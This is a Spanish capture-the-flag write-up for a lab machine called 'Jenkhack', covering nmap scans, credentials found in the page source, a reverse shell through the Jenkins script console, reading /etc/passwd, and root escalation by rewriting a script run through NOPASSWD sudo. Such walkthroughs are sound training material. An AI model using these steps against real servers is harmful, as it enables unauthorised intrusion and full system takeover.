# Maáquina Jenkhack

### puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

## servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,443,8080 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

![alt text](image-2.png)

## Entrando en la web por el puerto 80

al inspeccioar la web con ctrl + u -> http://172.17.0.2:80

encontramos esto:
jenkins-admin
cassandra

luego entramos por el puerto 8080 y son las credenciales:

![alt text](image-3.png)


## Intrusion

Estando dentro del jenkins, iremos a /script, esto nos llevará a una script conosole que nos permitirá ejecutar comandos. Para enviarnos una reverse shell, debemos ejecutar esto:

![alt text](image-4.png)

![alt text](image-5.png)

tratamiento de la tty

hicimos cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
jenkins:x:101:103:Jenkins,,,:/var/lib/jenkins:/bin/bash
jenkhack:x:1001:1001:jenkhack,,,:/home/jenkhack:/bin/bash


hicimos cat /var/www/jenkhack/note.txt


con cyberchef:

![alt text](image-6.png)


## cambiando al usuario jenkhack

su jenkhack:

jenkinselmejor



## Escalar privilegios

siendo el usuario jenkhack:

sudo -l 

User jenkhack may run the following commands on e952d5e5bb18:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash


eliminamos el archivo en opt bash.sh

creamos uno nuevo

nano bash.sh 

#!/bin/bash

exec /bin/bash

le damos permisos de ejecucion chmod +x bash.sh

sudo /usr/local/bin/bash y listo somos root !!!

